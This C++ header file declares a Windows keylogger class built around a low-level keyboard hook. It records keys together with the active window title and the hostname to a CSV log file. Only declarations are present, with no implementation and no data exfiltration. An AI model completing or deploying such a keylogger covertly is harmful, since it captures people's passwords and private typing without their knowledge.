#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>

//Keyboard scan codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54


class KeyLogger {

    public:

    static KeyLogger* getInstance();
    static void releaseInstance();

    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    //starts logging keyboard input
    void listen();




    HHOOK getHook();

    bool isAltDown();
    void setAltDown(bool down);

    bool isCtrlDown();
    void setCtrlDown(bool down);

    bool isLShiftDown();
    void setLShiftDown(bool down);

    bool isRShiftDown();
    void setRShiftDown(bool down);

    std::string getActiveWindowTitle();

    protected:

    KeyLogger(std::string logFilePath = "out.csv");
    ~KeyLogger();

    //logs the given key
    void log(DWORD key);

    //singleton
    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK hook;

    std::ofstream logFile;
    std::string hostname;
};

#endif // H_KEYLOGGER
